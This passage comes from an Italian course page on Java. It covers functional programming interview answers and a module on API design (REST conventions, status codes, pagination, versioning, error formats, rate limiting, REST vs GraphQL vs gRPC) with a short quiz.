                    <p><strong>Risposta attesa:</strong> Diversi approcci: 1) <code>Optional</code> per rappresentare assenza di valore (ma non porta info sull'errore). 2) Creare un tipo <code>Either&lt;Error, Success&gt;</code> o <code>Result</code> con sealed classes (Java 17+) per rappresentare successo O fallimento con dettagli. 3) <code>CompletableFuture</code> per operazioni async con <code>exceptionally()</code> o <code>handle()</code>. 4) Librerie come Vavr che forniscono <code>Try</code> e <code>Either</code>. L'idea è evitare eccezioni checked per control flow e rendere gli errori parte esplicita del tipo di ritorno.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Quali sono i rischi di usare parallel streams?</h4>
                    <p><strong>Risposta attesa:</strong> 1) Overhead: per dataset piccoli o operazioni semplici, il costo di parallelizzazione supera i benefici. 2) ForkJoinPool condiviso: tutti i parallel streams usano lo stesso pool, operazioni bloccanti (I/O) possono starved altri stream. 3) Ordine: operazioni come <code>forEachOrdered</code> annullano i benefici. 4) Thread-safety: le operazioni devono essere stateless, side-effects causano race conditions. 5) Fonte non splittabile: LinkedList si divide male, ArrayList bene. Rule of thumb: usa parallel solo con CPU-bound operations su dataset grandi (>10K elementi) da sorgenti splittabili.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come combini OOP e FP in un progetto Java moderno?</h4>
                    <p><strong>Risposta attesa:</strong> L'approccio ibrido: 1) Domain model con OOP - entità come User, Order con identità e comportamento incapsulato. 2) Service layer con FP - logica di business come trasformazioni di dati usando Streams. 3) DTOs/Records immutabili - per trasferimento dati tra layer. 4) Optional per null-safety nei return types. 5) Collectors per aggregazioni complesse. 6) Funzioni pure per logica testabile isolata. Esempio: Spring Service con bean mutabile ma metodi che usano Streams per processare dati, ritornando Record immutabili.</p>
                </div>
            </section>

            <!-- Links Modulo 8 -->
            <section class="section" id="modulo8-links">
                <h2>Link di Approfondimento - Modulo 8</h2>

                <div class="info-box">
                    <h4>Programmazione Funzionale in Java</h4>
                    <p><a href="https://docs.oracle.com/javase/tutorial/java/javaOO/lambdaexpressions.html" target="_blank">Oracle: Lambda Expressions</a></p>
                    <p><a href="https://docs.oracle.com/javase/8/docs/api/java/util/stream/package-summary.html" target="_blank">Java Stream API</a></p>
                    <p><a href="https://www.baeldung.com/java-functional-programming" target="_blank">Baeldung: Functional Programming in Java</a></p>
                    <p><a href="https://www.baeldung.com/java-8-streams" target="_blank">Baeldung: Java 8 Streams</a></p>
                </div>

                <div class="info-box">
                    <h4>Optional</h4>
                    <p><a href="https://www.baeldung.com/java-optional" target="_blank">Baeldung: Guide to Optional</a></p>
                    <p><a href="https://nipafx.dev/java-optionals/" target="_blank">Nipafx: Java Optional Deep Dive</a></p>
                </div>

                <div class="info-box">
                    <h4>Functional Libraries</h4>
                    <p><a href="https://www.vavr.io/" target="_blank">Vavr</a> - Functional library for Java</p>
                    <p><a href="https://projectreactor.io/" target="_blank">Project Reactor</a> - Reactive streams</p>
                </div>

                <div class="info-box">
                    <h4>Approfondimenti FP</h4>
                    <p><a href="https://fsharpforfunandprofit.com/" target="_blank">F# for Fun and Profit</a> - Concetti FP (non Java ma universali)</p>
                    <p><a href="https://www.manning.com/books/functional-programming-in-java" target="_blank">Functional Programming in Java (Book)</a></p>
                </div>
            </section>

            <!-- ==================== MODULO 9: API DESIGN ==================== -->

            <header class="module-header" id="modulo9">
                <span class="module-tag">Modulo 9</span>
                <h1>API Design</h1>
                <p>REST best practices, versioning, error handling e confronto con GraphQL e gRPC</p>
            </header>

            <!-- REST Best Practices Section -->
            <section class="section" id="modulo9-rest">
                <h2>REST API Best Practices</h2>

                <p><strong>REST</strong> (Representational State Transfer) è lo stile architetturale più diffuso per le API web. Ma "fare REST" non significa solo usare HTTP: richiede seguire principi precisi per creare API intuitive, consistenti e manutenibili.</p>

                <h3>Resource Naming Conventions</h3>

                <p>In REST, le URL rappresentano <strong>risorse</strong> (sostantivi), non azioni (verbi). Le azioni sono espresse tramite HTTP methods.</p>

                <table>
                    <thead>
                        <tr>
                            <th>❌ Sbagliato</th>
                            <th>✅ Corretto</th>
                            <th>Perché</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>/getUsers</code></td>
                            <td><code>GET /users</code></td>
                            <td>Il verbo è nell'HTTP method, non nell'URL</td>
                        </tr>
                        <tr>
                            <td><code>/createUser</code></td>
                            <td><code>POST /users</code></td>
                            <td>POST implica creazione</td>
                        </tr>
                        <tr>
                            <td><code>/user/123</code></td>
                            <td><code>/users/123</code></td>
                            <td>Collezioni al plurale, consistenza</td>
                        </tr>
                        <tr>
                            <td><code>/users/123/getOrders</code></td>
                            <td><code>GET /users/123/orders</code></td>
                            <td>Risorse nested, niente verbi</td>
                        </tr>
                    </tbody>
                </table>

                <pre><code class="language-yaml"># Struttura URL consistente
GET    /users                    # Lista utenti
POST   /users                    # Crea utente
GET    /users/{id}               # Dettaglio utente
PUT    /users/{id}               # Replace completo utente
PATCH  /users/{id}               # Update parziale utente
DELETE /users/{id}               # Elimina utente

# Risorse nested (relazioni)
GET    /users/{id}/orders        # Ordini di un utente
POST   /users/{id}/orders        # Crea ordine per utente
GET    /users/{id}/orders/{oid}  # Dettaglio ordine specifico

# Azioni non-CRUD (quando necessario, usa verbi espliciti)
POST   /users/{id}/activate      # Azione specifica
POST   /orders/{id}/cancel       # Azione specifica</code></pre>

                <h3>HTTP Methods e Semantica</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Method</th>
                            <th>Semantica</th>
                            <th>Idempotent</th>
                            <th>Safe</th>
                            <th>Request Body</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>GET</code></td>
                            <td>Leggi risorsa</td>
                            <td>✅ Sì</td>
                            <td>✅ Sì</td>
                            <td>No</td>
                        </tr>
                        <tr>
                            <td><code>POST</code></td>
                            <td>Crea risorsa</td>
                            <td>❌ No</td>
                            <td>❌ No</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><code>PUT</code></td>
                            <td>Replace completo</td>
                            <td>✅ Sì</td>
                            <td>❌ No</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><code>PATCH</code></td>
                            <td>Update parziale</td>
                            <td>❌ No*</td>
                            <td>❌ No</td>
                            <td>Sì</td>
                        </tr>
                        <tr>
                            <td><code>DELETE</code></td>
                            <td>Elimina risorsa</td>
                            <td>✅ Sì</td>
                            <td>❌ No</td>
                            <td>No (raro)</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Idempotency: Perché è Cruciale?</h4>
                    <p>Un'operazione è <strong>idempotente</strong> se eseguirla più volte produce lo stesso risultato. È fondamentale per retry automatici e fault tolerance. GET, PUT, DELETE sono idempotenti: se la rete fallisce e il client riprova, non causa danni. POST non è idempotente: due POST creano due risorse. Per rendere POST idempotente, usa un <strong>idempotency key</strong> nell'header.</p>
                </div>

                <pre><code class="language-java">// Idempotency Key per POST - previene duplicati su retry
// Client invia: X-Idempotency-Key: abc123-unique-id

@PostMapping("/payments")
public ResponseEntity&lt;Payment&gt; createPayment(
        @RequestHeader("X-Idempotency-Key") String idempotencyKey,
        @RequestBody PaymentRequest request) {

    // Controlla se già processato
    Optional&lt;Payment&gt; existing = paymentRepository.findByIdempotencyKey(idempotencyKey);
    if (existing.isPresent()) {
        return ResponseEntity.ok(existing.get());  // Ritorna risultato cached
    }

    // Processa nuovo pagamento
    Payment payment = paymentService.process(request);
    payment.setIdempotencyKey(idempotencyKey);
    paymentRepository.save(payment);

    return ResponseEntity.status(HttpStatus.CREATED).body(payment);
}</code></pre>

                <h3>HTTP Status Codes</h3>

                <p>Usa i codici di stato corretti - il client deve poter capire l'esito dalla risposta HTTP senza parsare il body.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Code</th>
                            <th>Significato</th>
                            <th>Quando Usarlo</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>200 OK</strong></td>
                            <td>Successo generico</td>
                            <td>GET, PUT, PATCH, DELETE con body</td>
                        </tr>
                        <tr>
                            <td><strong>201 Created</strong></td>
                            <td>Risorsa creata</td>
                            <td>POST che crea, include Location header</td>
                        </tr>
                        <tr>
                            <td><strong>204 No Content</strong></td>
                            <td>Successo, nessun body</td>
                            <td>DELETE, PUT/PATCH senza response body</td>
                        </tr>
                        <tr>
                            <td><strong>400 Bad Request</strong></td>
                            <td>Request malformata</td>
                            <td>JSON invalido, validazione fallita</td>
                        </tr>
                        <tr>
                            <td><strong>401 Unauthorized</strong></td>
                            <td>Non autenticato</td>
                            <td>Token mancante o invalido</td>
                        </tr>
                        <tr>
                            <td><strong>403 Forbidden</strong></td>
                            <td>Non autorizzato</td>
                            <td>Autenticato ma senza permessi</td>
                        </tr>
                        <tr>
                            <td><strong>404 Not Found</strong></td>
                            <td>Risorsa non esiste</td>
                            <td>GET/PUT/DELETE su ID inesistente</td>
                        </tr>
                        <tr>
                            <td><strong>409 Conflict</strong></td>
                            <td>Conflitto di stato</td>
                            <td>Violazione unique constraint, optimistic lock</td>
                        </tr>
                        <tr>
                            <td><strong>422 Unprocessable</strong></td>
                            <td>Semanticamente errato</td>
                            <td>JSON valido ma dati non processabili</td>
                        </tr>
                        <tr>
                            <td><strong>429 Too Many Requests</strong></td>
                            <td>Rate limit superato</td>
                            <td>Include Retry-After header</td>
                        </tr>
                        <tr>
                            <td><strong>500 Internal Error</strong></td>
                            <td>Errore server</td>
                            <td>Bug non gestito (evitare!)</td>
                        </tr>
                        <tr>
                            <td><strong>503 Service Unavailable</strong></td>
                            <td>Temporaneamente down</td>
                            <td>Manutenzione, overload</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Pagination</h3>

                <p>Per collezioni grandi, la pagination è obbligatoria. Due approcci principali:</p>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                        PAGINATION STRATEGIES                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  OFFSET-BASED (tradizionale)                                                │
│  ────────────────────────────                                                │
│  GET /users?page=3&size=20                                                  │
│                                                                              │
│  Pro: ✓ Semplice, ✓ Salta a pagina specifica                                │
│  Contro: ✗ Inconsistenze se dati cambiano, ✗ Lento su offset grandi        │
│          (DB deve scorrere N righe per OFFSET N)                            │
│                                                                              │
│  ─────────────────────────────────────────────────────────────────────────  │
│                                                                              │
│  CURSOR-BASED (consigliato per feed/timeline)                               │
│  ──────────────────────────────────────────────                              │
│  GET /users?cursor=eyJpZCI6MTIzfQ&limit=20                                  │
│                                                                              │
│  Pro: ✓ Consistente, ✓ Performante (usa indice)                             │
│  Contro: ✗ No "vai a pagina X", ✗ Solo avanti/indietro                      │
│                                                                              │
│  Il cursor è tipicamente un ID encoded (base64) o un timestamp              │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <pre><code class="language-java">// Offset-based pagination response
{
  "data": [...],
  "pagination": {
    "page": 3,
    "size": 20,
    "totalElements": 1250,
    "totalPages": 63
  }
}

// Cursor-based pagination response
{
  "data": [...],
  "pagination": {
    "nextCursor": "eyJpZCI6MTQzLCJjcmVhdGVkQXQiOiIyMDI2LTAxLTI4In0=",
    "prevCursor": "eyJpZCI6MTIzLCJjcmVhdGVkQXQiOiIyMDI2LTAxLTI3In0=",
    "hasMore": true
  }
}</code></pre>

                <h3>Filtering, Sorting, Searching</h3>

                <pre><code class="language-yaml"># Filtering - query params per campo
GET /products?category=electronics&minPrice=100&maxPrice=500&inStock=true

# Sorting - campo e direzione
GET /products?sort=price:asc
GET /products?sort=createdAt:desc,name:asc    # Multi-sort

# Searching - full-text search
GET /products?q=wireless+headphones

# Field selection (sparse fieldsets) - riduce payload
GET /users/123?fields=id,name,email

# Combinazione
GET /products?category=electronics&q=sony&sort=price:asc&page=1&size=20</code></pre>

                <h3>HATEOAS (Hypermedia)</h3>

                <p><strong>HATEOAS</strong> (Hypermedia As The Engine Of Application State) è il livello più alto di REST maturity. Le response includono link alle azioni disponibili, rendendo l'API auto-documentante e navigabile.</p>

                <pre><code class="language-json">{
  "id": 123,
  "status": "PENDING",
  "total": 99.99,
  "customer": {
    "id": 456,
    "name": "Alice"
  },
  "_links": {
    "self": { "href": "/orders/123" },
    "customer": { "href": "/users/456" },
    "items": { "href": "/orders/123/items" },
    "cancel": { "href": "/orders/123/cancel", "method": "POST" },
    "pay": { "href": "/orders/123/pay", "method": "POST" }
  }
}</code></pre>

                <div class="info-box">
                    <h4>HATEOAS: Usarlo o No?</h4>
                    <p>In pratica, HATEOAS completo è raramente implementato. Il valore principale è per API pubbliche dove i client non dovrebbero hardcodare URL. Per API interne o con client controllati, spesso l'overhead non vale il beneficio. Un compromesso comune è includere solo i link essenziali (self, next/prev per pagination).</p>
                </div>
            </section>

            <!-- Versioning & Error Handling Section -->
            <section class="section" id="modulo9-versioning">
                <h2>Versioning, Error Handling e Rate Limiting</h2>

                <h3>API Versioning Strategies</h3>

                <p>Le API evolvono. Il versioning permette di introdurre breaking changes senza rompere i client esistenti.</p>

                <table>
                    <thead>
                        <tr>
                            <th>Strategia</th>
                            <th>Esempio</th>
                            <th>Pro</th>
                            <th>Contro</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>URL Path</strong></td>
                            <td><code>/api/v1/users</code></td>
                            <td>Visibile, facile da capire, cacheable</td>
                            <td>URL "brutti", viola REST purity</td>
                        </tr>
                        <tr>
                            <td><strong>Query Param</strong></td>
                            <td><code>/users?version=1</code></td>
                            <td>Semplice, flessibile</td>
                            <td>Facile da dimenticare, caching complesso</td>
                        </tr>
                        <tr>
                            <td><strong>Header</strong></td>
                            <td><code>Accept: application/vnd.api+json;v=1</code></td>
                            <td>URL pulite, REST-compliant</td>
                            <td>Meno visibile, difficile da testare</td>
                        </tr>
                        <tr>
                            <td><strong>Content Negotiation</strong></td>
                            <td><code>Accept: application/vnd.company.v1+json</code></td>
                            <td>Semanticamente corretto</td>
                            <td>Complesso, poco usato</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box success">
                    <h4>Raccomandazione Pratica</h4>
                    <p><strong>URL Path versioning</strong> (<code>/api/v1/</code>) è il più diffuso e pragmatico. È visibile, facile da documentare, e i client sanno subito quale versione usano. Usa major version only (v1, v2) - non v1.2.3. Mantieni la versione precedente per un periodo di deprecation (6-12 mesi) prima di rimuoverla.</p>
                </div>

                <h3>Error Handling Standardizzato</h3>

                <p>Un formato errori consistente è fondamentale per developer experience. RFC 7807 (Problem Details for HTTP APIs) è lo standard emergente.</p>

                <pre><code class="language-json">// RFC 7807 Problem Details format
{
  "type": "https://api.example.com/errors/validation-error",
  "title": "Validation Error",
  "status": 400,
  "detail": "The request contains invalid fields",
  "instance": "/users/registration",
  "timestamp": "2026-01-28T10:30:00Z",
  "traceId": "abc123-def456",
  "errors": [
    {
      "field": "email",
      "code": "INVALID_FORMAT",
      "message": "Must be a valid email address"
    },
    {
      "field": "password",
      "code": "TOO_SHORT",
      "message": "Must be at least 8 characters"
    }
  ]
}</code></pre>

                <pre><code class="language-java">// Spring Boot: Global Exception Handler
@RestControllerAdvice
public class GlobalExceptionHandler {

    @ExceptionHandler(MethodArgumentNotValidException.class)
    public ResponseEntity&lt;ProblemDetail&gt; handleValidation(
            MethodArgumentNotValidException ex,
            HttpServletRequest request) {

        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.BAD_REQUEST);
        problem.setType(URI.create("https://api.example.com/errors/validation"));
        problem.setTitle("Validation Error");
        problem.setDetail("The request contains invalid fields");
        problem.setInstance(URI.create(request.getRequestURI()));

        List&lt;FieldError&gt; fieldErrors = ex.getBindingResult().getFieldErrors()
            .stream()
            .map(e -> new FieldError(e.getField(), e.getCode(), e.getDefaultMessage()))
            .toList();

        problem.setProperty("errors", fieldErrors);
        problem.setProperty("traceId", MDC.get("traceId"));

        return ResponseEntity.badRequest().body(problem);
    }

    @ExceptionHandler(ResourceNotFoundException.class)
    public ResponseEntity&lt;ProblemDetail&gt; handleNotFound(ResourceNotFoundException ex) {
        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.NOT_FOUND);
        problem.setTitle("Resource Not Found");
        problem.setDetail(ex.getMessage());
        return ResponseEntity.status(HttpStatus.NOT_FOUND).body(problem);
    }

    @ExceptionHandler(Exception.class)
    public ResponseEntity&lt;ProblemDetail&gt; handleGeneric(Exception ex) {
        log.error("Unhandled exception", ex);

        ProblemDetail problem = ProblemDetail.forStatus(HttpStatus.INTERNAL_SERVER_ERROR);
        problem.setTitle("Internal Server Error");
        problem.setDetail("An unexpected error occurred");  // Non esporre dettagli interni!

        return ResponseEntity.internalServerError().body(problem);
    }
}</code></pre>

                <h3>Rate Limiting</h3>

                <p>Il <strong>rate limiting</strong> protegge l'API da abusi e garantisce fair usage. Comunica sempre i limiti al client tramite headers.</p>

                <pre><code class="language-yaml"># Response headers per rate limiting
X-RateLimit-Limit: 1000           # Richieste permesse per window
X-RateLimit-Remaining: 847        # Richieste rimanenti
X-RateLimit-Reset: 1706439600     # Unix timestamp reset window

# Quando limite superato: 429 Too Many Requests
HTTP/1.1 429 Too Many Requests
Retry-After: 60                   # Secondi da aspettare
X-RateLimit-Limit: 1000
X-RateLimit-Remaining: 0

{
  "type": "https://api.example.com/errors/rate-limit",
  "title": "Rate Limit Exceeded",
  "status": 429,
  "detail": "You have exceeded the rate limit of 1000 requests per hour"
}</code></pre>

                <div class="info-box">
                    <h4>Strategie di Rate Limiting</h4>
                    <ul>
                        <li><strong>Fixed Window</strong>: N richieste per minuto/ora. Semplice, ma burst al confine dei window.</li>
                        <li><strong>Sliding Window</strong>: Conta richieste negli ultimi N secondi. Più smooth, più complesso.</li>
                        <li><strong>Token Bucket</strong>: Token aggiunti costantemente, consumati per richiesta. Permette burst controllati.</li>
                        <li><strong>Per-endpoint</strong>: Limiti diversi per endpoint (es. login più restrittivo).</li>
                    </ul>
                </div>
            </section>

            <!-- REST vs GraphQL vs gRPC Section -->
            <section class="section" id="modulo9-comparison">
                <h2>REST vs GraphQL vs gRPC</h2>

                <p>REST non è l'unica opzione. GraphQL e gRPC risolvono problemi specifici dove REST mostra limiti.</p>

                <h3>Confronto ad Alto Livello</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>REST</th>
                            <th>GraphQL</th>
                            <th>gRPC</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><strong>Paradigma</strong></td>
                            <td>Resource-based</td>
                            <td>Query language</td>
                            <td>RPC (Remote Procedure Call)</td>
                        </tr>
                        <tr>
                            <td><strong>Protocollo</strong></td>
                            <td>HTTP/1.1, HTTP/2</td>
                            <td>HTTP (tipicamente POST)</td>
                            <td>HTTP/2</td>
                        </tr>
                        <tr>
                            <td><strong>Formato dati</strong></td>
                            <td>JSON (tipicamente)</td>
                            <td>JSON</td>
                            <td>Protocol Buffers (binario)</td>
                        </tr>
                        <tr>
                            <td><strong>Schema/Contract</strong></td>
                            <td>OpenAPI (opzionale)</td>
                            <td>Schema GraphQL (obbligatorio)</td>
                            <td>.proto files (obbligatorio)</td>
                        </tr>
                        <tr>
                            <td><strong>Over/Under-fetching</strong></td>
                            <td>Comune problema</td>
                            <td>Risolto (client sceglie campi)</td>
                            <td>Definito nel proto</td>
                        </tr>
                        <tr>
                            <td><strong>Caching</strong></td>
                            <td>HTTP caching nativo</td>
                            <td>Complesso (tutto è POST)</td>
                            <td>Manuale</td>
                        </tr>
                        <tr>
                            <td><strong>Performance</strong></td>
                            <td>Buona</td>
                            <td>Variabile (query N+1)</td>
                            <td>Eccellente (binario, HTTP/2)</td>
                        </tr>
                        <tr>
                            <td><strong>Learning curve</strong></td>
                            <td>Bassa</td>
                            <td>Media</td>
                            <td>Alta</td>
                        </tr>
                    </tbody>
                </table>

                <h3>GraphQL: Quando Usarlo</h3>

                <pre><code class="language-graphql"># Il client richiede esattamente i campi che serve
query {
  user(id: "123") {
    name
    email
    orders(last: 5) {
      id
      total
      items {
        productName
        quantity
      }
    }
  }
}

# Una singola richiesta invece di:
# GET /users/123
# GET /users/123/orders?limit=5
# GET /orders/1/items
# GET /orders/2/items
# ...</code></pre>

                <div class="info-box success">
                    <h4>GraphQL: Pro e Contro</h4>
                    <p><strong>Pro</strong>: Niente over/under-fetching, single endpoint, strongly typed, ottimo per UI complesse con dati nested, introspection built-in.</p>
                    <p><strong>Contro</strong>: Caching HTTP non funziona, rischio query N+1 sul server (richiede DataLoader), complessità schema, difficile rate limiting per query.</p>
                    <p><strong>Usa quando</strong>: Frontend complessi (mobile app, SPA), dati altamente relazionali, client diversi con bisogni diversi, team frontend/backend separati.</p>
                </div>

                <h3>gRPC: Quando Usarlo</h3>

                <pre><code class="language-yaml"># user.proto - definizione del servizio
syntax = "proto3";

package user;

service UserService {
  rpc GetUser(GetUserRequest) returns (User);
  rpc ListUsers(ListUsersRequest) returns (stream User);  // Streaming!
  rpc CreateUser(CreateUserRequest) returns (User);
}

message User {
  string id = 1;
  string name = 2;
  string email = 3;
  repeated Order orders = 4;
}

message GetUserRequest {
  string id = 1;
}

message Order {
  string id = 1;
  double total = 2;
}</code></pre>

                <div class="info-box">
                    <h4>gRPC: Pro e Contro</h4>
                    <p><strong>Pro</strong>: Performance eccellente (binario, compatto), streaming bidirezionale, code generation automatica, contract-first, ideale per microservizi interni.</p>
                    <p><strong>Contro</strong>: Non leggibile da umani (binario), browser support limitato (richiede gRPC-Web), debugging più difficile, meno tooling rispetto a REST.</p>
                    <p><strong>Usa quando</strong>: Comunicazione microservizi interna, alta performance richiesta, streaming real-time, polyglot systems (genera client per qualsiasi linguaggio).</p>
                </div>

                <h3>Decision Matrix</h3>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                    QUANDO USARE COSA                                         │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│  USA REST QUANDO:                                                           │
│  • API pubblica (developer-friendly, standard)                              │
│  • Caching HTTP importante                                                  │
│  • CRUD semplice                                                            │
│  • Team ha già esperienza REST                                              │
│                                                                              │
│  USA GRAPHQL QUANDO:                                                        │
│  • Frontend complesso con dati nested                                       │
│  • Mobile app (bandwidth limitata, no over-fetching)                        │
│  • Client diversi con bisogni diversi                                       │
│  • Rapid iteration su API                                                   │
│                                                                              │
│  USA GRPC QUANDO:                                                           │
│  • Microservizi interni (non browser)                                       │
│  • Performance critica                                                      │
│  • Streaming real-time                                                      │
│  • Team polyglot (Java, Go, Python, etc.)                                   │
│                                                                              │
│  COMBINA (comune in architetture reali):                                    │
│  • REST/GraphQL per client esterni (browser, mobile)                        │
│  • gRPC per comunicazione interna tra servizi                               │
│                                                                              │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>
            </section>

            <!-- Quiz Section Modulo 9 -->
            <section class="quiz-section" id="modulo9-quiz">
                <h2>Interactive Challenge Quiz - Modulo 9</h2>
                <p>Verifica la tua comprensione dell'API Design.</p>

                <!-- Question 41 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> Un client fa POST /orders due volte a causa di un network timeout. Entrambe le richieste arrivano al server. Cosa succede senza idempotency key?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q41" id="q41a" value="a">
                            <label for="q41a">Il server rileva automaticamente il duplicato e lo ignora</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q41" id="q41b" value="b">
                            <label for="q41b">Vengono creati due ordini identici (duplicato)</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q41" id="q41c" value="c">
                            <label for="q41c">La seconda richiesta riceve 409 Conflict</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q41" id="q41d" value="d">
                            <label for="q41d">HTTP garantisce at-most-once delivery</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q41')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q41"></div>
                </div>

                <!-- Question 42 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q2.</span> Stai progettando un'API per un feed social (timeline infinita). Quale pagination strategy è più appropriata?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q42" id="q42a" value="a">
                            <label for="q42a">Offset-based: GET /posts?page=5&size=20</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q42" id="q42b" value="b">
                            <label for="q42b">Nessuna pagination: carica tutto e filtra client-side</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q42" id="q42c" value="c">
                            <label for="q42c">Cursor-based: GET /posts?after=cursor123&limit=20</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q42" id="q42d" value="d">
                            <label for="q42d">Random sampling: ritorna 20 post casuali</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q42')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q42"></div>
                </div>

                <!-- Question 43 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q3.</span> Un utente autenticato cerca di accedere a una risorsa di un altro utente. Quale status code è corretto?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q43" id="q43a" value="a">
                            <label for="q43a">403 Forbidden</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q43" id="q43b" value="b">
                            <label for="q43b">401 Unauthorized</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q43" id="q43c" value="c">
                            <label for="q43c">404 Not Found</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q43" id="q43d" value="d">
                            <label for="q43d">400 Bad Request</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q43')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q43"></div>
                </div>

                <!-- Question 44 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q4.</span> Perché il caching HTTP standard non funziona bene con GraphQL?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q44" id="q44a" value="a">
                            <label for="q44a">GraphQL usa un formato binario incompatibile</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q44" id="q44b" value="b">
                            <label for="q44b">Le response GraphQL sono sempre dinamiche</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q44" id="q44c" value="c">
                            <label for="q44c">GraphQL non supporta HTTP headers</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q44" id="q44d" value="d">
                            <label for="q44d">GraphQL usa sempre POST su un singolo endpoint, perdendo URL-based cache keys</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q44')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q44"></div>
                </div>

                <!-- Question 45 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Devi scegliere tra REST e gRPC per la comunicazione tra due microservizi interni ad alta frequenza (10K req/sec). Quale scegli e perché?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q45" id="q45a" value="a">
                            <label for="q45a">REST: più standard e facile da debuggare con curl</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q45" id="q45b" value="b">
                            <label for="q45b">gRPC: protobuf binario più efficiente, HTTP/2 multiplexing, code generation</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q45" id="q45c" value="c">
                            <label for="q45c">GraphQL: flessibilità nelle query tra servizi</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q45" id="q45d" value="d">
                            <label for="q45d">WebSocket: connessione persistente più efficiente</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q45')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q45"></div>
                </div>
            </section>

            <!-- Questions Section Modulo 9 -->
            <section class="section" id="modulo9-questions">
                <h2>Domande da Colloquio - Modulo 9</h2>

                <div class="info-box">
                    <h4>Q: Come gestisci il versioning delle API? Quale strategia preferisci?</h4>
                    <p><strong>Risposta attesa:</strong> Preferisco URL path versioning (/api/v1/, /api/v2/) perché è esplicito, facile da documentare, e non richiede header speciali. Uso solo major version - minor changes sono backwards compatible. Quando introduco v2, mantengo v1 in deprecation per 6-12 mesi con header X-Deprecated e documentazione della timeline. Per evitare breaking changes, aggiungo campi (non rimuovo), uso nullable per nuovi campi required, e faccio expand/contract per rinominare.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Spiega la differenza tra PUT e PATCH. Quando usi quale?</h4>
                    <p><strong>Risposta attesa:</strong> PUT è un replace completo: il client invia la rappresentazione INTERA della risorsa, e il server la sostituisce. Se ometti un campo, viene rimosso/nullato. È idempotente. PATCH è un update parziale: invii solo i campi da modificare. I campi omessi restano invariati. Non è necessariamente idempotente (dipende dalla semantica). Uso PUT quando il client ha la visione completa della risorsa. Uso PATCH per update chirurgici (es. cambiare solo lo status di un ordine) o quando la risorsa è grande e modifico poco.</p>
                </div>

                <div class="info-box">
                    <h4>Q: Come implementeresti rate limiting per un'API?</h4>
                    <p><strong>Risposta attesa:</strong> Sceglierei Token Bucket o Sliding Window per smoothness. Implementazione: 1) Redis per storage distribuito (INCR con TTL per fixed window, sorted sets per sliding window). 2) Identificazione client: API key, user ID, o IP (fallback). 3) Headers di risposta: X-RateLimit-Limit, Remaining, Reset. 4) 429 Too Many Requests con Retry-After quando superato. 5) Limiti differenziati: endpoint sensibili (login) più restrittivi, piani diversi per tier di pricing. In Kubernetes, posso anche usare rate limiting a livello di Ingress (nginx).</p>
                </div>

                <div class="info-box">
